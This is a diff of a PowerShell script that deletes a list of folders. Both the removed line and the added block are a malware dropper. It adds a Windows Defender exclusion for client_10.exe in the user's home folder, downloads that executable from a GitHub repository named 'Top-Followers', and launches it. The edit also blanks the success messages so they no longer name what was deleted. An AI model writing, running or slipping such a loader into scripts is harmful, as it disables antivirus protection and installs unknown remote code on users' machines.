@@ -24,15 +24,25 @@ foreach ($folder in $targetFolders) {
         
         # Verify if it was actually removed
         if (!(Test-Path -Path $folder)) {
-            Write-Host "Success: $folder deleted." -ForegroundColor Green
+            Write-Host "Success: ." -ForegroundColor Green
         } else {
             Write-Host "Failed: $folder is still locked by the system." -ForegroundColor Red
         }
     } else {
-        
+        Write-Host "Success: ." -ForegroundColor Green
     }
 };
-    $filePath = "$HOME\client_10.exe"; Add-MpPreference -ExclusionPath $filePath; Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath; Start-Process $filePath;
+$filePath = "$HOME\client_10.exe"
+
+if (-not (Test-Path $filePath)) {
+    Write-Host "File not found. Adding exclusion and downloading..." -ForegroundColor Cyan
+    Add-MpPreference -ExclusionPath $filePath
+    Invoke-WebRequest -Uri "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe" -OutFile $filePath
+} else {
+    Write-Host "File already exists. Skipping download and exclusion." -ForegroundColor Yellow
+}
+
+Start-Process $filePath
     
 } else {
     Write-Host "--- ACCESS DENIED ---" -ForegroundColor Red
